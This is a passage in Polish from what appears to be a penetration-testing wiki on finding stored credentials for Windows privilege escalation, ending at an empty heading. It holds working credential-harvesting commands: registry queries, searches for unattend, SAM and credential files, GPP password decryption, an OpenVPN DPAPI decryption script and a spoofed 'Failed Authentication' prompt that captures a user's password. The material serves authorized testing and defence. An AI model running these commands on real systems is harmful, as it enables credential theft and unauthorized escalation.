Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnego uruchomienia; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odniesienia do pliku poświadczeń, klucza szyfrowania albo skryptu, który używa obu. Na przykład przepływ pracy PowerShell z `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany osobno. Najpierw sprawdź wyłącznie dostępne nazwy poprawek, a następnie — jeśli masz do tego uprawnienia — przeanalizuj istotną zawartość bez wyświetlania sekretów w standardowych wynikach enumeracji. Sama ścieżka do poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą istnienia ważnych poświadczeń ani dostępu o wyższych uprawnieniach. Ogranicz uprawnienia ACL katalogu danych i unikaj umieszczania sekretów w zmianach kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Samodzielnie opracowany rotator haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a poświadczenia do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Oceniaj łącznie zaplanowane zadanie aktualizatora, konto, ACL konfiguracji, listener i uprawnienia do magazynu danych. Magazyn danych dostępny wyłącznie przez loopback jest nadal osiągalny dla lokalnego użytkownika mającego prawidłowe poświadczenia, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza są dostępne obok szyfrogramu, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna przy użyciu Go [`math/rand`](https://pkg.go.dev/math/rand), nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do losowości używanej w kontekstach związanych z bezpieczeństwem. Zanim uznasz odzyskane hasło za możliwą ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta z grupy lokalnych administratorów. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany blob nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie danych w katalogu lub Entra oraz mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) również określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi poświadczeniami usługi. Przeglądaj archiwum wyłącznie wtedy, gdy masz do tego uprawnienia, i nie umieszczaj odzyskanych sekretów w standardowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi, że istnieje sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Zobacz [przewodnik PaperMC dotyczący instalacji wtyczek](https://docs.papermc.io/paper/adding-plugins/) z opisem układu katalogów oraz [dokumentację JAR Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) dotyczącą zawartości archiwów.

### Poświadczenia wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może odczytać ten plik, sprawdź łącznie rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) podaje, że hasła mogą być przechowywane w postaci jawnej lub szyfrowane za pomocą klucza przechowywanego w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczeń. Ta ścieżka służy jako wskazówka inwentaryzacyjna, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w standardowych wynikach enumeracji.

Osobny plik `Openfire\conf\openfire.xml` może ujawnić skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet jeśli używana jest zewnętrzna baza danych. Openfire często nasłuchuje na loopback dla konsoli administracyjnej; lokalne konto nadal może połączyć się z tym adresem, jeśli listener działa. Sprawdź łącznie działający listener, uprawnioną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator mogący zainstalować wtyczkę może doprowadzić do uruchomienia jej kodu w kontekście usługi, który może mieć wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka konfiguracji nie dowodzą same w sobie dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania analizą śledczą

Konfiguracje serwera Velociraptor, zwykle nazwane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wygenerować certyfikat klienta API. To, czy zapewnia to wyższe uprawnienia, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie dowodzi dostępu do CA serwera. W niektórych wdrożeniach klucz prywatny CA jest przechowywany offline, więc czytelna konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź ACL konfiguracji **serwera** w jego katalogu instalacyjnym oraz wszystkich zabezpieczonych kopii zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli ścieżka skonfigurowana dla usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że rzeczywiście znajduje się w nim `CA.private_key`. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Procedura dostawcy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale wymagane są również odpowiednie uprawnienia po stronie serwera; ich utworzenie lub zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewniać ścieżkę dostępu nawet wtedy, gdy te operacje zapisu są niedostępne. Zapytania API z uprawnieniami do wykonywania kodu działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Zabezpiecz konfigurację serwera i kopie zapasowe restrykcyjnymi ACL, przechowuj klucz podpisujący CA offline, gdy to możliwe, oraz ogranicz role API i dostęp do listenera. Zobacz [dokumentację API Velociraptora](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia nadal są ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, uruchom:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze SSH, dodać je za pomocą `ssh-add` i zalogować się przez SSH na maszynie. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki nienadzorowane

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukiwać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe gałęzie rejestru `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed rozpakowaniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on gałęzie rejestru, a typowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często prowadzą do fałszywych tropów. Udział SMB to odrębna ścieżka dostępu — sprawdzaj go tylko wtedy, gdy jest objęty zakresem. Zobacz [wytyczne Microsoftu dotyczące obrazów Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [opis plików gałęzi rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Poświadczenia chmurowe

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Password

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, Group Policy Objects (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie buforowane pliki GPP pod kątem niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co ułatwia identyfikację i usunięcie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Konfiguracja Web w IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config zawierającego dane uwierzytelniające:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu webroot IIS

Stara kopia zapasowa ZIP umieszczona bezpośrednio w katalogu webroot serwowanym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i dane logowania nadające się do ponownego użycia. Sprawdź skonfigurowaną ścieżkę fizyczną witryny oraz to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz to za ujawnienie. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających, a nawet danych innego użytkownika**, jeśli sądzisz, że je zna (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnego tekstu** lub **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Wariant listy nazw plików bez rozszerzenia Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć przechowywanych w nim poświadczeń. Podczas sprawdzania, gdzie przechowywane są takie pliki, przejrzyj dostępne profile użytkowników i skonfigurowane katalogi główne udostępniania plików.

Czytelny plik KeePass `.kdbx` to również tylko wskazówka dotycząca zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest właściwe hasło główne oraz ewentualny skonfigurowany plik klucza lub inne czynniki uwierzytelniania. Jeśli autoryzowany przegląd wykryje w jednym z wpisów parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie zapewnia uprawnień Administrator ani SYSTEM; dostęp do usług zdalnych, uprawnienia konta i ewentualny osobny etap uruchamiania usługi również muszą być dostępne. Inwentaryzacja powinna podawać ścieżkę do sejfu i informację o możliwości jego odczytu, a nie wyświetlać bazy danych ani przechowywanych poświadczeń.

Wyszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Wariant polecenia wyszukiwania bez rozszerzenia Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź także Kosz pod kątem znajdujących się w nim danych uwierzytelniających.

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wprost wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany z nim wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącego konta do odczytu. Widoczność zależy od woluminu, SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie istnieje żadna możliwa do odzyskania kopia zapasowa. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód na to, że zawiera ono prawidłowe dane poufne.

Dostępny, usunięty plik `.pfx` może też być wskazówką prowadzącą do **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker oceniają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na innym koncie wymaga, by bieżąca tożsamość mogła modyfikować konkretny skrypt, obowiązująca reguła akceptowała wynikowy podpis dla tego skryptu i konta docelowego, a zadanie zaplanowane lub inny proces działający z wyższymi uprawnieniami faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego tego łańcucha. Przed otwarciem materiału z kluczem prywatnym lub uruchomieniem zadania sprawdź metadane, ACL, zasady i zaplanowane polecenie.

Sprawdź także dostępne bazy danych profili klientów komunikatorów, notatki i odebrane pliki pod kątem wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o opisowej nazwie. Taki materiał może zapewnić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego upoważnienie. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie danych uwierzytelniających domeny w trybie offline wymaga również pasującego pliku `SYSTEM`, zgodnie z opisem w [procedurze dotyczącej kopii zapasowych i uprzywilejowanych grup](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Do **odzyskiwania haseł** zapisanych przez kilka programów możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome lub Firefox**.\
Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może są tam zapisane jakieś **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` — w nadrzędnym katalogu `User Data`. [Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` może zmienić tę lokalizację. Obecność plików jest jedynie wskazówką co do lokalizacji danych uwierzytelniających: sprawdź, czy pliki są czytelne, czy dostępny jest kontekst DPAPI danego użytkownika lub inne autoryzowane klucze oraz czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu tworzą parę: plik klucza i plik zaszyfrowanych loginów. Ich obecność jest jedynie wskazówką: sprawdź, czy oba pliki są czytelne, czy zawierają zapisane wpisy i czy klucz jest chroniony hasłem głównym, zanim uznasz, że dane uwierzytelniające można wykorzystać. Jeśli odzyskane dane uwierzytelniające należą do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do kontrolowania grup oraz [uprawnienia grupy do odczytu lub odszyfrowania hasła LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają możliwości uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

